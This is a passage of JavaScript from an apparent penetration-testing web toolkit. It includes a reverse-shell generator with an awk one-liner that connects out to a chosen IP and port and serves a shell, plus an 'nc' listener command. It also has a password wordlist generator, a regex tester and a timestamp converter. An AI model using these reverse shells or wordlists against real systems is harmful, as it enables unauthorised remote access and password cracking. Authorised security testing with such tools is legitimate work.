                    `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'`,
                ],
            };

            const selected = shells[type] || [`echo "Shell type ${type} not implemented"`];
            const listener = `nc -lvnp ${port}`;

            let html = `<div class="result-header"><h4>Listener Command</h4></div>
                <div class="payload-list"><div class="payload-item"><code>${SecAssem.escapeHtml(listener)}</code>
                <button class="copy-btn" onclick="SecAssem.copyToClipboard('${listener}')">📋</button></div></div>`;
            html += SecAssem.makePayloadList(selected, `${type.charAt(0).toUpperCase() + type.slice(1)} Reverse Shell → ${ip}:${port}`);
            document.getElementById('revshell-generator-results').innerHTML = html;
            SecAssem.showToast(`Generated ${selected.length} reverse shell commands`, 'success');
        },

        /* ===== Wordlist Generator ===== */
        wordlistGenerator() {
            const baseWords = document.getElementById('wordlist-generator-words').value.trim().split('\n').filter(Boolean).map(w => w.trim());
            if (!baseWords.length) { SecAssem.showToast('Please enter base words', 'warning'); return; }

            const opts = {
                numbers: document.getElementById('wordlist-generator-numbers').checked,
                special: document.getElementById('wordlist-generator-special').checked,
                leet: document.getElementById('wordlist-generator-leet').checked,
                capitalize: document.getElementById('wordlist-generator-capitalize').checked,
                years: document.getElementById('wordlist-generator-years').checked,
                reverse: document.getElementById('wordlist-generator-reverse').checked,
                double: document.getElementById('wordlist-generator-double').checked,
            };

            const wordlist = new Set(baseWords);
            baseWords.forEach(w => {
                wordlist.add(w.toLowerCase());
                wordlist.add(w.toUpperCase());
                if (opts.capitalize) {
                    wordlist.add(w.charAt(0).toUpperCase() + w.slice(1).toLowerCase());
                    wordlist.add(w.toLowerCase());
                    wordlist.add(w.toUpperCase());
                }
                if (opts.reverse) wordlist.add(w.split('').reverse().join(''));
                if (opts.double) wordlist.add(w + w);
                if (opts.leet) {
                    const leet = w.replace(/a/gi, '4').replace(/e/gi, '3').replace(/i/gi, '1').replace(/o/gi, '0').replace(/s/gi, '5').replace(/t/gi, '7');
                    wordlist.add(leet);
                    if (opts.capitalize) wordlist.add(leet.charAt(0).toUpperCase() + leet.slice(1));
                }
                if (opts.numbers) {
                    for (let i = 0; i <= 9; i++) { wordlist.add(w + i); wordlist.add(i + w); }
                    for (let i = 0; i <= 99; i++) { wordlist.add(w + i); }
                    [123, 1234, 12345, 321, 111, 000, 666, 777, 888, 999].forEach(n => wordlist.add(w + n));
                }
                if (opts.special) {
                    ['!', '@', '#', '$', '%', '&', '*', '!@#', '!!', '!1', '@1', '#1', '123!'].forEach(s => {
                        wordlist.add(w + s);
                    });
                }
                if (opts.years) {
                    for (let y = 2020; y <= 2026; y++) { wordlist.add(w + y); wordlist.add(y + w); }
                }
            });

            const list = [...wordlist];
            const preview = list.slice(0, 100);

            let html = `<div class="result-header"><h4>Wordlist Generated: ${list.length} entries</h4>
                <button class="btn-secondary btn-sm" onclick="SecAssem.downloadFile('wordlist.txt', '${list.join('\\n').replace(/'/g, "\\'")}')">⬇ Download .txt</button></div>`;
            html += `<p>Showing first ${Math.min(100, list.length)} of ${list.length} entries</p>`;
            html += '<div class="payload-list">';
            preview.forEach(w => { html += `<div class="payload-item"><code>${SecAssem.escapeHtml(w)}</code></div>`; });
            if (list.length > 100) html += `<div class="payload-item"><em>... and ${list.length - 100} more</em></div>`;
            html += '</div>';
            document.getElementById('wordlist-generator-results').innerHTML = html;
            SecAssem.showToast(`Generated ${list.length} words`, 'success');
        },

        /* ===== Regex Tester ===== */
        regexTest() {
            const pattern = document.getElementById('regex-tester-pattern').value;
            const text = document.getElementById('regex-tester-text').value;
            if (!pattern || !text) {
                document.getElementById('regex-tester-results').innerHTML = '<p class="no-results">Enter a pattern and test string</p>';
                return;
            }

            let flags = '';
            if (document.getElementById('regex-tester-g').checked) flags += 'g';
            if (document.getElementById('regex-tester-i').checked) flags += 'i';
            if (document.getElementById('regex-tester-m').checked) flags += 'm';
            if (document.getElementById('regex-tester-s').checked) flags += 's';

            try {
                const regex = new RegExp(pattern, flags);
                const matches = [];
                let match;
                if (flags.includes('g')) {
                    while ((match = regex.exec(text)) !== null) {
                        matches.push({ value: match[0], index: match.index, groups: match.slice(1) });
                        if (match[0] === '') { regex.lastIndex++; }
                    }
                } else {
                    match = regex.exec(text);
                    if (match) matches.push({ value: match[0], index: match.index, groups: match.slice(1) });
                }

                // Highlight matches
                let highlighted = SecAssem.escapeHtml(text);
                if (matches.length) {
                    let offset = 0;
                    const sorted = [...matches].sort((a, b) => a.index - b.index);
                    highlighted = '';
                    let last = 0;
                    sorted.forEach(m => {
                        highlighted += SecAssem.escapeHtml(text.substring(last, m.index));
                        highlighted += `<mark class="regex-match">${SecAssem.escapeHtml(m.value)}</mark>`;
                        last = m.index + m.value.length;
                    });
                    highlighted += SecAssem.escapeHtml(text.substring(last));
                }

                let html = `<div class="result-header"><h4>Matches: ${matches.length}</h4></div>
                    <pre class="code-block regex-preview">${highlighted}</pre>`;
                if (matches.length) {
                    html += '<table class="data-table"><thead><tr><th>#</th><th>Match</th><th>Index</th><th>Groups</th></tr></thead><tbody>';
                    matches.forEach((m, i) => {
                        html += `<tr><td>${i + 1}</td><td><code>${SecAssem.escapeHtml(m.value)}</code></td><td>${m.index}</td>
                            <td>${m.groups.length ? m.groups.map((g, gi) => `Group ${gi + 1}: <code>${SecAssem.escapeHtml(g || '')}</code>`).join(', ') : '—'}</td></tr>`;
                    });
                    html += '</tbody></table>';
                }
                document.getElementById('regex-tester-results').innerHTML = html;
            } catch (e) {
                document.getElementById('regex-tester-results').innerHTML = `<p class="no-results" style="color:var(--color-critical)">Invalid regex: ${SecAssem.escapeHtml(e.message)}</p>`;
            }
        },

        /* ===== Timestamp Converter ===== */
        timestampNow() {
            document.getElementById('timestamp-converter-input').value = Math.floor(Date.now() / 1000);
            this.timestampConverter();
        },

        timestampConverter() {
            const input = document.getElementById('timestamp-converter-input').value.trim();
            if (!input) { SecAssem.showToast('Please enter a timestamp or date', 'warning'); return; }

            let date;
            const num = Number(input);
            if (!isNaN(num)) {
                // Unix timestamp
                date = num > 1e12 ? new Date(num) : new Date(num * 1000); // ms vs seconds
            } else {
                date = new Date(input);
            }

            if (isNaN(date.getTime())) {
                SecAssem.showToast('Invalid timestamp or date', 'error');
                return;
            }

            const unixSec = Math.floor(date.getTime() / 1000);
            const unixMs = date.getTime();
            const now = new Date();
            const diffSec = Math.abs(Math.floor((now - date) / 1000));
            const relative = diffSec < 60 ? `${diffSec} seconds` :
                diffSec < 3600 ? `${Math.floor(diffSec / 60)} minutes` :
                diffSec < 86400 ? `${Math.floor(diffSec / 3600)} hours` :
                diffSec < 31536000 ? `${Math.floor(diffSec / 86400)} days` :
                `${Math.floor(diffSec / 31536000)} years`;
            const direction = date > now ? 'from now' : 'ago';

            document.getElementById('timestamp-converter-results').innerHTML = `
                <div class="result-header"><h4>Timestamp Conversion</h4></div>
                <table class="data-table"><tbody>
                    <tr><td><strong>Unix (seconds)</strong></td><td><code>${unixSec}</code> <button class="copy-btn" onclick="SecAssem.copyToClipboard('${unixSec}')">📋</button></td></tr>
                    <tr><td><strong>Unix (milliseconds)</strong></td><td><code>${unixMs}</code> <button class="copy-btn" onclick="SecAssem.copyToClipboard('${unixMs}')">📋</button></td></tr>
                    <tr><td><strong>UTC</strong></td><td><code>${date.toUTCString()}</code></td></tr>
                    <tr><td><strong>Local</strong></td><td><code>${date.toString()}</code></td></tr>
                    <tr><td><strong>ISO 8601</strong></td><td><code>${date.toISOString()}</code> <button class="copy-btn" onclick="SecAssem.copyToClipboard('${date.toISOString()}')">📋</button></td></tr>
                    <tr><td><strong>RFC 2822</strong></td><td><code>${date.toUTCString()}</code></td></tr>
                    <tr><td><strong>Relative</strong></td><td>${relative} ${direction}</td></tr>
                </tbody></table>`;
        },
    },
};

// Initialize on DOM ready
document.addEventListener('DOMContentLoaded', () => SecAssem.init());

// Handle clicking outside modal to close
document.getElementById('modal-overlay')?.addEventListener('click', (e) => {
    if (e.target.id === 'modal-overlay') SecAssem.closeModal();
});

// Port scanner search on input
document.getElementById('port-scanner-search')?.addEventListener('input', () => {
    if (SecAssem.currentTool === 'port-scanner') SecAssem.tools.portScanner();
});
